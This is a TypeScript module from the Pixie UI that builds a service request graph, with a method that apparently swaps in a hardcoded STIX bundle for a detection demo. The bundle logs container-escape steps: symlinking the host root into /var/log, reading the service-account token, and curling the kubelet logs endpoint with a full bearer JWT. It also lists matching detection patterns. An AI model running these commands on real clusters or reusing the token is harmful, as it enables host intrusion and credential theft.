/*
 * Copyright 2018- The Pixie Authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * SPDX-License-Identifier: Apache-2.0
 */

import { data as visData } from 'vis-network/standalone';

import { dataWithUnitsToString, formatBySemType } from 'app/containers/format-data/format-data';
import { WidgetDisplay } from 'app/containers/live/vis';
import { deepLinkURLFromSemanticType, EmbedState } from 'app/containers/live-widgets/utils/live-view-params';
import { Relation, SemanticType } from 'app/types/generated/vizierapi_pb';
import { Arguments } from 'app/utils/args-utils';
import { formatFloat64Data } from 'app/utils/format-data';

import { semTypeToShapeConfig } from './graph-utils';

// An entity in the service graph. Could be a service, pod, or IP address.
export interface Entity {
  id: string;
  label: string;
  // Display configuration properties.
  // `value` determines how to size this node.
  value?: number;
  // `url` contains the entity URL that this node should link to (if any).
  url?: string;
  // `shape` contains shape configuration properties for the node.
  shape?: string;
  // `image` contains the image to use when the node is selected/unselected.
  image?: { selected?: string; unselected?: string };
}

// Statistics about an edge.
interface EdgeStats {
  p50: number;
  p90: number;
  p99: number;
  errorRate: number;
  rps: number;
  inboundBPS: number;
  outboundBPS: number;
  totalRequests: number;
}

// An edge in the service graph. If X is the client in requests to Y,
// and Y is the client in requests to X, then X->Y and Y->X will both be
// present in the edge list.
export interface Edge extends EdgeStats {
  id?: string;
  // These are inherent properies of the edge that we capture from
  // the underlying data.
  from: string;
  to: string;
  // Display configuration parameters.
  // These are properties of the edge that we determine based on visualization
  // parameters.
  value?: number;
  title?: string;
  color?: string;
}

// Defines the input interface for the data we get for a single entry (edge) in the table.
interface InputEdgeInfo extends EdgeStats {
  responderPod: string;
  responderSvc: string;
  responderIP: string;
  requestorPod: string;
  requestorSvc: string;
  requestorIP: string;
}

export interface RequestGraphDisplay extends WidgetDisplay {
  readonly requestorPodColumn: string;
  readonly responderPodColumn: string;
  readonly requestorServiceColumn: string;
  readonly responderServiceColumn: string;
  readonly requestorIPColumn: string;
  readonly responderIPColumn: string;
  readonly p50Column: string;
  readonly p90Column: string;
  readonly p99Column: string;
  readonly errorRateColumn: string;
  readonly requestsPerSecondColumn: string;
  readonly inboundBytesPerSecondColumn: string;
  readonly outboundBytesPerSecondColumn: string;
  readonly totalRequestCountColumn: string;
}

/**
 * Interface for a request graph.
 */
export interface RequestGraph {
  nodes: visData.DataSet<any>;
  edges: visData.DataSet<any>;
}

// Turns a record into an InputEdgeInfo based on the configured columns.
const getEdgeInfo = (value: any, display: RequestGraphDisplay): InputEdgeInfo => ({
  responderPod: value[display.responderPodColumn],
  responderSvc: value[display.responderServiceColumn],
  responderIP: value[display.responderIPColumn],
  requestorPod: value[display.requestorPodColumn],
  requestorSvc: value[display.requestorServiceColumn],
  requestorIP: value[display.requestorIPColumn],
  p50: value[display.p50Column],
  p90: value[display.p90Column],
  p99: value[display.p99Column],
  errorRate: value[display.errorRateColumn],
  rps: value[display.requestsPerSecondColumn],
  inboundBPS: value[display.inboundBytesPerSecondColumn],
  outboundBPS: value[display.outboundBytesPerSecondColumn],
  totalRequests: value[display.totalRequestCountColumn],
});

const humanReadableMetric = (value: any, semType: SemanticType, defaultUnits: string): string => {
  if (semType === SemanticType.ST_NONE || semType === SemanticType.ST_UNSPECIFIED) {
    return `${formatFloat64Data(value)}${defaultUnits}`;
  }
  const valWithUnits = formatBySemType(semType, value);
  return dataWithUnitsToString(valWithUnits);
};

const getEdgeText = (edge: EdgeStats, display: RequestGraphDisplay,
  semTypes: { [key: string]: SemanticType }): string => {
  const bps = edge.inboundBPS + edge.outboundBPS;

  const bpsSemType = semTypes[display.inboundBytesPerSecondColumn];
  const rpsSemType = semTypes[display.requestsPerSecondColumn];
  const errorSemType = semTypes[display.errorRateColumn];
  const p50SemType = semTypes[display.p50Column];
  const p90SemType = semTypes[display.p90Column];
  const p99SemType = semTypes[display.p99Column];

  return [
    humanReadableMetric(bps, bpsSemType, ' B/s'),
    humanReadableMetric(edge.rps, rpsSemType, ' req/s'),
    `Error: ${humanReadableMetric(edge.errorRate, errorSemType, '%')}`,
    `p50: ${humanReadableMetric(edge.p50, p50SemType, 'ms')}`,
    `p90: ${humanReadableMetric(edge.p90, p90SemType, 'ms')}`,
    `p99: ${humanReadableMetric(edge.p99, p99SemType, 'ms')}`,
  ].join('<br>\n');
};

const edgeFromStats = (edge: EdgeStats, from: string, to: string,
  display: RequestGraphDisplay, semTypes: { [key: string]: SemanticType }) => ({
  ...edge,
  from,
  to,
  value: edge.inboundBPS + edge.outboundBPS,
  title: getEdgeText(edge, display, semTypes),
});

// For each edge in the dataset, get the unclustered entities we want to use as the nodes.
// Order of preference for unclustered: pod, service, IP, <unknown>.
const getPod = (pod, svc, ip: string): [string, SemanticType] => {
  if (pod) {
    return [pod, SemanticType.ST_POD_NAME];
  }
  if (svc) {
    return [svc, SemanticType.ST_SERVICE_NAME];
  }
  if (ip) {
    return [ip, SemanticType.ST_IP_ADDRESS];
  }
  return ['<unknown>', SemanticType.ST_NONE];
};

// For each edge in the dataset, get the clustered entities we want to use as the nodes.
// Order of preference for clustered: service, pod, IP, <unknown>.
const getService = (svc, pod, ip: string): [string, SemanticType] => {
  if (svc) {
    return [svc, SemanticType.ST_SERVICE_NAME];
  }
  if (pod) {
    return [pod, SemanticType.ST_POD_NAME];
  }
  if (ip) {
    return [ip, SemanticType.ST_IP_ADDRESS];
  }
  return ['<unknown>', SemanticType.ST_NONE];
};

const upsertNode = (nodes: Map<string, Entity>, name: string, semType: SemanticType,
  bytes: number, selectedClusterName: string, embedState: EmbedState, propagatedArgs?: Arguments) => {
  // Accumulate the total bytes received by this node.
  if (nodes.has(name)) {
    const value = nodes.get(name).value + bytes;
    nodes.set(name, {
      ...nodes.get(name),
      value,
    });
    return;
  }

  const url = deepLinkURLFromSemanticType(semType, name, selectedClusterName, embedState,
    propagatedArgs);

  nodes.set(name, {
    ...semTypeToShapeConfig(semType),
    id: name,
    label: name,
    value: bytes,
    url,
  });
};

// From a collection of edges, estimate the summed edge statistics.
// This is an estimation, not an exact calculation.
// See the following discussion for technique and more information:
// https://stats.stackexchange.com/questions/171784/estimation-of-quantile-given-quantiles-of-subset
const estimateClusteredEdge = (edgeStatsArray: EdgeStats[]): EdgeStats => {
  const clusteredEdgeStats: EdgeStats = {
    p50: 0,
    p90: 0,
    p99: 0,
    errorRate: 0,
    rps: 0,
    inboundBPS: 0,
    outboundBPS: 0,
    totalRequests: 0,
  };
  // Compute the additive statistics.
  edgeStatsArray.forEach((edgeStat: EdgeStats) => {
    clusteredEdgeStats.rps += edgeStat.rps;
    clusteredEdgeStats.inboundBPS += edgeStat.inboundBPS;
    clusteredEdgeStats.outboundBPS += edgeStat.outboundBPS;
    clusteredEdgeStats.totalRequests += edgeStat.totalRequests;
  });
  // Estimate the non-additive statistics.
  edgeStatsArray.forEach((edgeStat: EdgeStats) => {
    // This shouldn't happen, but if the data format we receive back ever changes, we should
    // avoid accidentally dividing by 0.
    if (!clusteredEdgeStats.totalRequests) {
      return;
    }
    const requestRatio = edgeStat.totalRequests / clusteredEdgeStats.totalRequests;
    clusteredEdgeStats.p50 += edgeStat.p50 * requestRatio;
    clusteredEdgeStats.p90 += edgeStat.p90 * requestRatio;
    clusteredEdgeStats.p99 += edgeStat.p99 * requestRatio;
    clusteredEdgeStats.errorRate += edgeStat.errorRate * requestRatio;
  });

  return clusteredEdgeStats;
};

/**
 * Parses the data passed in on the request graph and manages the graph data structure.
 */
export class RequestGraphManager {
  private readonly nodes: visData.DataSet<any>;

  private readonly edges: visData.DataSet<any>;

  private readonly clusteredNodes: visData.DataSet<any>;

  private readonly clusteredEdges: visData.DataSet<any>;

  constructor() {
    this.nodes = new visData.DataSet();
    this.edges = new visData.DataSet();
    this.clusteredNodes = new visData.DataSet();
    this.clusteredEdges = new visData.DataSet();
  }

  // Returns the nodes, clustered by pod.
  // Falls back to service or IP address if pod is not resolved.
  public getRequestGraph(clusteredMode: boolean): RequestGraph {
    if (clusteredMode) {
      return {
        nodes: this.clusteredNodes,
        edges: this.clusteredEdges,
      };
    }
    return {
      nodes: this.nodes,
      edges: this.edges,
    };
  }

  // Sets the edge color of the graph based on an input function.
  public setEdgeColor(colorFn: (edge: Edge) => string): void {
    // Set the edge color for both the clustered and unclustered versions of the graph.
    this.edges.getDataSet().forEach((edge) => {
      this.edges.update({
        ...edge,
        color: colorFn(edge),
      });
    });
    this.clusteredEdges.getDataSet().forEach((edge) => {
      this.clusteredEdges.update({
        ...edge,
        color: colorFn(edge),
      });
    });
  }

  public parseInputData(data: any[], relation: Relation, display: RequestGraphDisplay,
    selectedClusterName: string, embedState?: EmbedState, propagatedArgs?: Arguments): void {
    // Keeps a unique map of the clustered nodes.
    const clusteredNodeMap = new Map<string, Entity>();
    // Keeps a unique map of the clustered edges (since svc1->svc2 may be represented by multiple
    // records).
    const clusteredEdgesMap = new Map<string, Map<string, EdgeStats[]>>();
    // Keeps a unique map of the unclustered nodes.
    const nodeMap = new Map<string, Entity>();
    // Edges grouped by pod/IP are automatically unique,
    // so we don't need an equivalent to `clusteredEdgesMap` here.

    // Capture the semantic types for the columns.
    const semTypes: { [key: string]: SemanticType } = {};
    relation.getColumnsList().forEach((col) => {
      semTypes[col.getColumnName()] = col.getColumnSemanticType();
    });

    // Loop through all the data and create/update pods and edges.
    for (const value of data) {
      const edge: InputEdgeInfo = getEdgeInfo(value, display);

      const [from, fromSemType] = getPod(edge.requestorPod, edge.requestorSvc, edge.requestorIP);
      const [to, toSemType] = getPod(edge.responderPod, edge.responderSvc, edge.responderIP);
      const [fromClustered, fromClusteredSemType] = getService(edge.requestorSvc, edge.requestorPod, edge.requestorIP);
      const [toClustered, toClusteredSemType] = getService(edge.responderSvc, edge.responderPod, edge.responderIP);

      if (!from || !to || !fromClustered || !toClustered) {
        continue;
      }

      // Add this (non-clustered) edge, no more processing needed for this structure.
      this.edges.add(edgeFromStats(edge, from, to, display, semTypes));

      // Initialize the clustered edge maps and add this edge to the map.
      if (!clusteredEdgesMap.has(fromClustered)) {
        clusteredEdgesMap.set(fromClustered, new Map());
      }
      if (!clusteredEdgesMap.get(fromClustered).has(toClustered)) {
        clusteredEdgesMap.get(fromClustered).set(toClustered, []);
      }
      clusteredEdgesMap.get(fromClustered).get(toClustered).push(edge);

      // Ensure the nodes (both clustered and non-clustered) are unique.
      upsertNode(nodeMap, from, fromSemType, edge.outboundBPS, selectedClusterName,
        embedState, propagatedArgs);
      upsertNode(nodeMap, to, toSemType, edge.inboundBPS, selectedClusterName,
        embedState, propagatedArgs);
      upsertNode(clusteredNodeMap, fromClustered, fromClusteredSemType, edge.outboundBPS,
        selectedClusterName, embedState, propagatedArgs);
      upsertNode(clusteredNodeMap, toClustered, toClusteredSemType, edge.inboundBPS,
        selectedClusterName, embedState, propagatedArgs);
    }

    this.finalizeGraph(nodeMap, clusteredNodeMap, clusteredEdgesMap, display, semTypes);
  }

  private oldFinalizeGraph(nodeMap: Map<string, Entity>, clusteredNodeMap: Map<string, Entity>,
    clusteredEdgesMap: Map<string, Map<string, EdgeStats[]>>,
    display: RequestGraphDisplay, semTypes: { [key: string]: SemanticType }): void {
    nodeMap.forEach((value) => {
      this.nodes.add(value);
    });
    clusteredNodeMap.forEach((value) => {
      this.clusteredNodes.add(value);
    });
    clusteredEdgesMap.forEach((subMap, fromClustered) => {
      subMap.forEach((edgeStatsArray, toClustered) => {
        const clusteredEdgeStats = estimateClusteredEdge(edgeStatsArray);
        this.clusteredEdges.add(
          edgeFromStats(clusteredEdgeStats, fromClustered, toClustered,
            display, semTypes));
      });
    });
  }

    private finalizeGraph(
    nodeMap: Map<string, Entity>,
    clusteredNodeMap: Map<string, Entity>,
    clusteredEdgesMap: Map<string, Map<string, EdgeStats[]>>,
    display: RequestGraphDisplay,
    semTypes: { [key: string]: SemanticType }): void {
      const rawData =  {
      "type": "bundle",
      "id": "bundle--b0a0ae1b-924c-4028-a002-76eb2a28628b",
      "spec_version": "2.1",
      "objects": [
          {
              "type": "process",
              "name": "curl https://10.1.0.1:10250/logs/root_link/var/lib/kubelet/",
              "id": "process--250315T18453114948f67154d1000315083g",
              "pid": 315083,
              "command_line": "/bin/bash -c \"curl -sk -H \"Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im9SRktYamNyUVg1LUp3anlkLWdDLU9FMmhmYTV2aTJQTVo5bXQ2YVM0d0kifQ.eyJhdWQiOlsiaHR0cHM6Ly9jb250YWluZXIuZ29vZ2xlYXBpcy5jb20vdjEvcHJvamVjdHMvYWRscy11dmJibXl6Zmxmc2oycnBwYWFrMGxmbGFxL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEvY2x1c3RlcnMvazhzLWNhYXMtMDAwOC1iZXRhIl0sImV4cCI6MTc3MzU5ODM0MiwiaWF0IjoxNzQyMDYyMzQyLCJpc3MiOiJodHRwczovL2NvbnRhaW5lci5nb29nbGVhcGlzLmNvbS92MS9wcm9qZWN0cy9hZGxzLXV2YmJteXpmbGZzajJycHBhYWswbGZsYXEvbG9jYXRpb25zL2V1cm9wZS13ZXN0MS9jbHVzdGVycy9rOHMtY2Fhcy0wMDA4LWJldGEiLCJqdGkiOiI0NjExZmViMy05NjdlLTQ0NDMtOTU2OC1lMDJhZGQxMGUzZmQiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImRlbW8iLCJub2RlIjp7Im5hbWUiOiJna2UtazhzLWNhYXMtMDAwOC1iZXRhLXVzZXItcG9vbC04MGIwZTcyNC1iZTJmIiwidWlkIjoiNGVhM2Q1NmEtNWIwMC00OTYyLThlYTItNTFjMTFjZTFiNjM1In0sInBvZCI6eyJuYW1lIjoia3ViZXNwbG9pdC1zZXJ2ZXItNTc3Njg4NjRkNi1tbXI3biIsInVpZCI6IjA5ZTlmOTIwLTRjNjQtNGJhYi04YjE3LTQyNDYzZTUyOTg3YSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoidmFybG9nLXNhIiwidWlkIjoiZTgxZTUxMTctMmZlZi00OTUyLWFkYzItOTZkMTNiN2ZjOWEzIn0sIndhcm5hZnRlciI6MTc0MjA2NTk0OX0sIm5iZiI6MTc0MjA2MjM0Miwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlbW86dmFybG9nLXNhIn0.O7TPAomlR0JGI5d51h1Jq8gszpGrX3u5i5HJN001t1TJRChhiOh23TUfrrzGY6CBlBNDDZs4OSBqzounmXX3t2Wyi8xFi0vl6L6cw7eNRik_BX7yv7E7LmHmLlZc-lgPhuL7Hdo7TNd3KkGCm4bJIsyQPyxsO73e3xi7TLB1oowkkE9Bej27bKawYWls1T-HpO-U6rEB6ubtQok9HEZfIkTklup3ofXLJdxSbT588qLIBmTzils9RNCYSj-sOdv4JuH0QrI4rIZDeRNf2Ls2CbMfuP9Ygue3UkSXooxJwAzlnUW1g5e2mycYpDq50827Rw-jhI10DsoE4Ztx7GiHnQ\" https://10.1.0.1:10250/logs/root_link/var/lib/kubelet/pods/02b73946-93e4-46af-a198-5869e1222a3b/volumes/kubernetes.io~projected/\"",
              "cwd": "/",
              "created_time": "2025-03-15T18:45:31.144847703Z",
              "extensions": {
                  "flags": "execve rootcwd clone dataArgs",
                  "image_id": "ghcr.io/k8sstormcenter/kubesploit-server@sha256:e7beb9d827170b6f257e3cc249dce199debc88b58ec75ad497d783f54337e085",
                  "container_id": "containerd://948f67154d10d0090cae5d7c660f3cc571306e030acf79cf5bbdf1310bb69db9",
                  "pod_name": "kubesploit-server-57768864d6-mmr7n",
                  "namespace": "demo",
                  "function_name": "",
                  "parent_pid": null,
                  "parent_command_line": "None None",
                  "parent_cwd": null,
                  "grand_parent_pid": null,
                  "kprobe0": "",
                  "kprobe1": "",
                  "kprobe2": "",
                  "kprobe3": "",
                  "kprobe4": ""
              }
          },
          {
              "type": "observed-data",
              "id": "observed-data--6063cf78-8b59-447a-90cf-02ff43030914",
              "created": "2025-03-17T15:49:48.223286+00:00Z",
              "first_observed": "2025-03-17T15:49:48.223286+00:00Z",
              "last_observed": "2025-03-17T15:49:48.223286+00:00Z",
              "number_observed": 1,
              "object_refs": [
                  "process--250315T18453114948f67154d1000315083g",
                  "indicator--kh-ce-var-log-route"
              ],
              "extensions": {
                  "alert_name": null,
                  "correlation": "250315T18453114948f67154d1000315083gke-k8s-caas",
                  "rule_id": null,
                  "node_info": {
                      "node_name": "gke-k8s-caas-0008-beta-user-pool-80b0e724-be2f"
                  },
                  "children": ""
              }
          },
          {
              "type": "relationship",
              "spec_version": "2.1",
              "id": "relationship--ea9b45b3-e658-4f63-85ce-f2966450a6bc",
              "created": "2025-03-17T15:49:48.281084+00:00Z",
              "modified": "2025-03-17T15:49:48.281145+00:00Z",
              "relationship_type": "indicates",
              "source_ref": "bundle--b0a0ae1b-924c-4028-a002-76eb2a28628b",
              "target_ref": "indicator--kh-ce-var-log-route"
          },
          {
              "type": "attack-pattern",
              "id": "attack-pattern--kh-ce-var-log-route",
              "name": "CE_VAR_LOG_ROUTE",
              "description": "Arbitrary file reads on the host from a node via an exposed /var/log mount by calling to API:10250"
          },
          {
              "type": "indicator",
              "id": "indicator--kh-ce-var-log-route",
              "name": "Access NODE-logs via API 10250",
              "description": "Access NODE-logs via API at port 10250",
              "pattern": "[process:command_line MATCHES '10250/logs/' ]",
              "pattern_type": "stix",
              "valid_from": "2024-01-01T00:00:00Z"
          },
          {
              "type": "relationship",
              "id": "relationship--kh-ce-var-log-route",
              "relationship_type": "indicates",
              "source_ref": "indicator--kh-ce-var-log-route",
              "target_ref": "attack-pattern--kh-ce-var-log-route"
          },
          {
              "type": "process",
              "id": "process--250315T18445739948f67154d1000314774g",
              "name": "ln -s / /var/log/host/root_link",
              "pid": 314774,
              "command_line": "/usr/bin/ln -s / /var/log/host/root_link",
              "cwd": "/",
              "created_time": "2025-03-15T18:44:57.390465310Z",
              "extensions": {
                  "flags": "execve rootcwd",
                  "image_id": "ghcr.io/k8sstormcenter/kubesploit-server@sha256:e7beb9d827170b6f257e3cc249dce199debc88b58ec75ad497d783f54337e085",
                  "container_id": "containerd://948f67154d10d0090cae5d7c660f3cc571306e030acf79cf5bbdf1310bb69db9",
                  "pod_name": "kubesploit-server-57768864d6-mmr7n",
                  "namespace": "demo",
                  "function_name": "__x64_sys_symlinkat",
                  "parent_pid": "Z2tlLWs4cy1jYWFzLTAwMDgtYmV0YS11c2VyLXBvb2wtODBiMGU3MjQtYmUyZjo0MDc1MDEwMjg1NzI5MjozMTQ3NzQ=",
                  "parent_command_line": "/bin/bash -c \"ln -s / /var/log/host/root_link\"",
                  "parent_cwd": "/",
                  "grand_parent_pid": "Z2tlLWs4cy1jYWFzLTAwMDgtYmV0YS11c2VyLXBvb2wtODBiMGU3MjQtYmUyZjozODc5NTMyMjk4NTA3NjoyOTk0MTI=",
                  "kprobe0": "/",
                  "kprobe1": -100,
                  "kprobe2": "/var/log/host/root_link",
                  "kprobe3": "",
                  "kprobe4": ""
              }
          },
          {
              "type": "observed-data",
              "name": "detect-ce-var-log-symlink",
              "id": "observed-data--20517b87-876e-40c0-b9ba-04d7564485ad",
              "created": "2025-03-17T15:49:45.735778+00:00Z",
              "first_observed": "2025-03-17T15:49:45.735778+00:00Z",
              "last_observed": "2025-03-17T15:49:45.735778+00:00Z",
              "number_observed": 1,
              "object_refs": [
                  "process--250315T18445739948f67154d1000314774g",
                  "indicator--kh-ce-var-log-symlink"
              ],
              "extensions": {
                  "alert_name": "KPROBE_ACTION_POST",
                  "correlation": "250315T18445739948f67154d1000314774gke-k8s-caas",
                  "rule_id": "detect-ce-var-log-symlink",
                  "node_info": {
                      "node_name": "gke-k8s-caas-0008-beta-user-pool-80b0e724-be2f"
                  },
                  "children": ""
              }
          },
          {
              "type": "relationship",
              "spec_version": "2.1",
              "id": "relationship--cab63cd7-fa1a-4431-b491-7c28674684f8",
              "created": "2025-03-17T15:49:45.855959+00:00Z",
              "modified": "2025-03-17T15:49:45.856013+00:00Z",
              "relationship_type": "indicates",
              "source_ref": "bundle--0c2d7ce5-f3ce-496f-a35f-2a5bf73d21c8",
              "target_ref": "indicator--kh-ce-var-log-symlink"
          },
          {
              "type": "attack-pattern",
              "id": "attack-pattern--kh-ce-var-log-symlink",
              "name": "CE_VAR_LOG_SYMLINK",
              "description": "Arbitrary file reads on the host from a node via an exposed /var/log mount.."
          },
          {
              "type": "indicator",
              "id": "indicator--kh-ce-var-log-symlink",
              "name": "Symlink to log dir",
              "description": "Symbolic link to /var/log/root_link",
              "pattern": "[(process:command_line MATCHES 'ln -s' AND process:extensions.function_name MATCHES '__x64_sys_symlinkat' OR process:extensions.kprobe2.string_arg MATCHES 'var/log') OR (process:command_line MATCHES '/proc/net/route' OR process:command_line MATCHES 'ip')]",
              "pattern_type": "stix",
              "valid_from": "2024-01-01T00:00:00Z"
          },
          {
              "type": "relationship",
              "id": "relationship--kh-ce-var-log-symlink",
              "relationship_type": "indicates",
              "source_ref": "indicator--kh-ce-var-log-symlink",
              "target_ref": "attack-pattern--kh-ce-var-log-symlink"
          },
          {
              "type": "relationship",
              "id": "relationship--kh-ce-var-log-route-token",
              "relationship_type": "indicates",
              "source_ref": "attack-pattern--kh-ce-var-log-token",
              "target_ref": "attack-pattern--kh-ce-var-log-route"
          },
          {
              "type": "process",
              "name": "secrets/2025_03_15_18_12_22/token",
              "id": "process--250315T18451306948f67154d1000314924g",
              "pid": 314924,
              "command_line": "/usr/bin/cat //var/run/secrets/kubernetes.io/serviceaccount/token",
              "cwd": "/",
              "created_time": "2025-03-15T18:45:13.069624091Z",
              "extensions": {
                  "flags": "execve rootcwd",
                  "image_id": "ghcr.io/k8sstormcenter/kubesploit-server@sha256:e7beb9d827170b6f257e3cc249dce199debc88b58ec75ad497d783f54337e085",
                  "container_id": "containerd://948f67154d10d0090cae5d7c660f3cc571306e030acf79cf5bbdf1310bb69db9",
                  "pod_name": "kubesploit-server-57768864d6-mmr7n",
                  "namespace": "demo",
                  "function_name": "security_file_permission",
                  "parent_pid": "Z2tlLWs4cy1jYWFzLTAwMDgtYmV0YS11c2VyLXBvb2wtODBiMGU3MjQtYmUyZjo0MDc2NTc4MjUzNDIwNDozMTQ5MjQ=",
                  "parent_command_line": "/bin/bash -c \"cat //var/run/secrets/kubernetes.io/serviceaccount/token\"",
                  "parent_cwd": "/",
                  "grand_parent_pid": "Z2tlLWs4cy1jYWFzLTAwMDgtYmV0YS11c2VyLXBvb2wtODBiMGU3MjQtYmUyZjozODc5NTMyMjk4NTA3NjoyOTk0MTI=",
                  "kprobe0": {
                      "path": "/run/secrets/kubernetes.io/serviceaccount/..2025_03_15_18_12_22.1866428227/token",
                      "permission": "-rw-r--r--"
                  },
                  "kprobe1": 4,
                  "kprobe2": "",
                  "kprobe3": "",
                  "kprobe4": ""
              }
          },
          {
              "type": "observed-data",
              "name": "enumerate-service-account",
              "id": "observed-data--e472c5bd-c252-477a-ba1e-2a85544539c1",
              "created": "2025-03-17T18:32:20.968448+00:00Z",
              "first_observed": "2025-03-17T18:32:20.968448+00:00Z",
              "last_observed": "2025-03-17T18:32:20.968448+00:00Z",
              "number_observed": 1,
              "object_refs": [
                  "process--250315T18451306948f67154d1000314924g",
                  "indicator--kh-ce-var-log-token"
              ],
              "extensions": {
                  "alert_name": "KPROBE_ACTION_POST",
                  "correlation": "250315T18451306948f67154d1000314924gke-k8s-caas",
                  "rule_id": "enumerate-service-account",
                  "node_info": {
                      "node_name": "gke-k8s-caas-0008-beta-user-pool-80b0e724-be2f"
                  },
                  "children": ""
              }
          },
          {
              "type": "relationship",
              "spec_version": "2.1",
              "id": "relationship--76baa894-00c3-4ab8-b43c-d1e1a086f996",
              "created": "2025-03-17T18:32:21.039726+00:00Z",
              "modified": "2025-03-17T18:32:21.039778+00:00Z",
              "relationship_type": "indicates",
              "source_ref": "bundle--4d8d8ff1-daa7-4421-b4bd-23de1259202c",
              "target_ref": "indicator--kh-ce-var-log-token"
          },
          {
              "type": "attack-pattern",
              "id": "attack-pattern--kh-ce-var-log-token",
              "name": "CE_VAR_LOG_TOKEN",
              "description": "In order to access the logs, the pods own token must be used"
          },
          {
              "type": "indicator",
              "id": "indicator--kh-ce-var-log-token",
              "name": "pod token access",
              "description": "pod token used",
              "pattern": "[process:extensions.function_name MATCHES 'security_file_permission' ]",
              "pattern_type": "stix",
              "valid_from": "2024-01-01T00:00:00Z"
          },
          {
              "type": "relationship",
              "id": "relationship--kh-ce-var-log-token",
              "relationship_type": "indicates",
              "source_ref": "indicator--kh-ce-var-log-token",
              "target_ref": "attack-pattern--kh-ce-var-log-token"
          },
          {
              "type": "relationship",
              "id": "relationship--kh-ce-var-log-token-symlink",
              "relationship_type": "indicates",
              "source_ref": "attack-pattern--kh-ce-var-log-symlink",
              "target_ref": "attack-pattern--kh-ce-var-log-token"
          }
      ]}

      this.nodes.clear();
      this.edges.clear();
      this.clusteredNodes.clear();
      this.clusteredEdges.clear();
      rawData.objects.forEach((obj) => {
        if (obj.type !== 'relationship') {
          this.nodes.add({
            id: obj.id,
            label: obj.name || obj.type,
            title: JSON.stringify(obj, null, 2),
          });
        }

        if (obj.type === 'relationship' && obj.source_ref && obj.target_ref) {
          this.edges.add({
            id: obj.id,
            from: obj.source_ref,
            to: obj.target_ref,
            label: obj.relationship_type,
            title: JSON.stringify(obj, null, 2),
          });
        }
        if (obj.type === 'observed-data' && Array.isArray(obj.object_refs)) {
          obj.object_refs.forEach((refId) => {
            this.edges.add({
              from: obj.id,
              to: refId,
              label: 'refers-to',
              title: `Observed-data refers-to ${refId}`,
            });
          });
        }
      });
  }
}
